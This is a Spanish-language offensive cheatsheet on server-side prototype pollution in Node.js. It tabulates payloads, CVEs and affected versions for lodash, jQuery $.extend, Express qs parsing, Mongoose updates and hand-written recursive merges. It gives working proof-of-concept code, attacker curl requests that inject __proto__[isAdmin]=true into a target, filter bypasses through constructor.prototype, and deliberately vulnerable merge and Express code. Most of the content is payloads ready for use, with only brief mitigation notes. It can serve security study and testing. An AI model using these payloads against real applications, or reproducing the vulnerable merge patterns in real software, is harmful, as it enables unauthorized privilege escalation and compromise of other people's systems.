---
aliases:
  - Server-Side PP
  - Node.js Prototype Pollution
  - Lodash PP
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
---
# Prototype Pollution - Vectores Server-Side

***

## Lodash (`_.merge` / `_.set` / `_.defaultsDeep`)

| **Función** | **CVE / version** | **Payload** |
|:---:|:---:|:---:|
| `_.merge` | CVE-2018-3721 (<4.17.5), CVE-2019-10744 (<4.17.12) | `_.merge({}, JSON.parse('{"__proto__":{"polluted":"true"}}'))` |
| `_.mergeWith` | Mismas versiones | Igual mecanismo. |
| `_.set` | CVE-2020-8203 (<4.17.20) | `_.set({}, '__proto__.polluted', 'true')` o `_.set({}, ['__proto__','polluted'],'true')`. |
| `_.setWith` | Mismas | Igual. |
| `_.defaultsDeep` | CVE-2018-16487 | `_.defaultsDeep({}, JSON.parse('{"constructor":{"prototype":{"polluted":"true"}}}'))` |
| `_.zipObjectDeep` | CVE-2020-8203 | `_.zipObjectDeep(['__proto__.polluted'], ['true'])` |
| Backend Express típico | `app.post('/api', (req,res) => { _.merge(config, req.body); res.send('ok') })` | Body controlado por user. |
| Combine con NoSQL injection | `_.merge` + Mongoose `findOneAndUpdate` con `$set` | Combo. |
| Bypass en lodash 4.17.5+ | Usar `constructor.prototype` cuando `__proto__` filtrado | Filter incompleto. |
| Bypass en 4.17.21+ | Casi todos parchados — buscar custom forks | Edge case. |
^pp-server-lodash

### PoC server-side lodash

```javascript
const _ = require('lodash');
const obj = {};

// User input via JSON body
const userInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
_.merge(obj, userInput);

console.log({}.isAdmin);  // true ← TODOS los objetos ahora tienen isAdmin:true
```

___

## jQuery `$.extend` deep

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Vulnerable call | `$.extend(true, target, src)` | `true` flag = recursive (vulnerable). |
| jQuery <3.4.0 | CVE-2019-11358 | Versions vulnerable. |
| Stack típico | jQuery server-side via Cheerio o JSDOM | jQuery en Node. |
| Payload básico | `$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))` | Polución global. |
| Mitigation deep:false | `$.extend(false, ...)` o `$.extend({...})` no recursive | Safe pattern. |
| jQuery 3.4.0+ | Patched — añade check de `__proto__` | Pero `constructor.prototype` aún funciona. |
| Server-side templating | jQuery + lodash + handlebars chain | Common stack. |
^pp-server-jquery

___

## Express body-parser y `qs`

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| qs default Express | `app.use(express.urlencoded({extended:true}))` | `extended:true` usa qs (vulnerable a parse de `__proto__`). |
| qs query string | `?__proto__[polluted]=yes` | Server convierte a `{__proto__:{polluted:'yes'}}` object. |
| qs nested | `?obj[__proto__][polluted]=yes` | Nested keys. |
| qs array | `?__proto__[]=yes` | Array notation. |
| body-parser <1.18 | CVE-2017-16129 | Older versions. |
| Express extend false | `extended:false` usa qs simple (no nested) | Safer. |
| Connect / Koa parsers | Same family as Express — same bugs | Affected. |
| Hapi (joi schemas) | Joi schemas suelen rejectar `__proto__` keys | Más seguro. |
^pp-server-express

### Express PP via qs

```javascript
// app.js (vulnerable)
const express = require('express');
const app = express();
app.use(express.urlencoded({extended: true}));  // qs lib

app.get('/health', (req,res) => res.json({status: 'ok'}));

app.post('/profile', (req, res) => {
  // PP triggered ANTES de llegar acá si qs parsea __proto__ keys
  res.send('ok');
});

// Atacante:
// curl -X POST 'https://target/profile?__proto__[isAdmin]=true' -d 'name=x'
// Después:
// curl https://target/health → {status:"ok",isAdmin:true}
```

___

## Mongoose Schema Bypass

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Schema con `strict:false` | Schema permite cualquier field | Vulnerable a PP via update. |
| `findOneAndUpdate` con $set | `User.findOneAndUpdate({_id:userId}, {$set: req.body})` | req.body controlado → injection. |
| Combine con NoSQL operator injection | `{"__proto__":{"$ne":null}}` | NoSQL + PP combo. |
| MongoDB `Document.set` | Igual concepto que `_.set` | Native Mongoose. |
| Mongoose plugins | Plugins custom que mergean | Riesgo extendido. |
| Bypass MongoSafeguard | Lib que filtra `__proto__` — usar `constructor.prototype` | Filter bypass. |
| Schema `Mixed` type | Field type Mixed acepta cualquier estructura | Wide vector. |
| Versions afectadas | Mongoose <5.13.15 algunos plugins | Lookup CVE. |
^pp-server-mongoose

___

## `Object.assign` con Input Controlado

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Object.assign shallow | `Object.assign(target, src)` — solo top level | Por sí mismo NO PP (no recursivo). |
| Custom recursive merge | Loop manual de keys que descend en objetos | Vulnerable si dev olvida check de `__proto__`. |
| Spread operator deep | `{...target, ...src}` shallow safe | Same como assign. |
| Inseguros: rfdc, deepmerge | Algunos deep clone libs | Lookup CVE per lib. |
| `klona` (deep clone) | Versions <2.0 affected | Lookup. |
| custom JSON.parse + merge | `JSON.parse(req.body)` → `mergeRecursive(target, parsed)` | Common anti-pattern. |
| `Function.prototype.bind` con user obj | `func.bind(thisArg, ...userArgs)` | Edge case PP. |
^pp-server-objectassign

### Custom recursive merge vulnerable

```javascript
// Anti-pattern que muchos devs escriben
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Atacante:
merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);  // 'yes' ← global pollution
```

***
